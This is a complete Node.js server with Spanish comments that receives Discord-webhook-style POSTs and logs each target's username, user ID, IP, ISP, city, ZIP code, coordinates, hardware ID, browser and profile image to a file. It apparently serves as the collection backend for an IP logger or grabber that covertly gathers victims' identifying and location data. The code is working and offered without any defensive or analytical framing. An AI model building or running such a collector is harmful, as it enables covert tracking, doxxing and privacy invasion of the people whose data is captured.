const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                
                let info = {};

                // Extraemos absolutamente todos los campos del embed
                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    data.embeds[0].fields.forEach(field => {
                        info[field.name] = field.value;
                    });
                }

                // Armamos un reporte completo detallado con todos los datos recolectados
                const logEntry = `--- [${timestamp}] NUEVO REGISTRO ---\n` +
                                 `Usuario: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'})\n` +
                                 `IP: ${info["IP Address"] || 'N/A'} | ISP: ${info["ISP"] || 'N/A'} | Tipo: ${info["Type"] || 'N/A'}\n` +
                                 `Ubicación: ${info["City"] || 'N/A'}, ${info["Region"] || 'N/A'}, ${info["Country"] || 'N/A'} (ZIP: ${info["Zip Code"] || 'N/A'})\n` +
                                 `Coordenadas: ${info["Lat, Long"] || 'N/A'} | Capital: ${info["Capital"] || 'N/A'} | Moneda: ${info["Currency"] || 'N/A'}\n` +
                                 `Zona Horaria: ${info["Timezone"] || 'N/A'} | Estado: ${info["Status"] || 'N/A'} | Locale: ${info["Locale"] || 'N/A'}\n` +
                                 `HWID: ${info["HWID"] || 'N/A'}\n` +
                                 `Navegador: ${info["Browser"] || 'N/A'}\n` +
                                 `URL: ${info["URL"] || 'N/A'}\n` +
                                 `Perfil: ${info["Profile Image"] || 'N/A'}\n` +
                                 `-----------------------------------------\n\n`;
                
                console.log("Reporte completo guardado.");

                fs.appendFile('logs.txt', logEntry, err => {
                    if (err) console.error("Error al guardar en el archivo:", err);
                });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "success", message: "Guardado completo" }));
            } catch (e) {
                console.error("Error al procesar JSON:", e);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});

const PORT = process.env.PORT || 26237;
server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
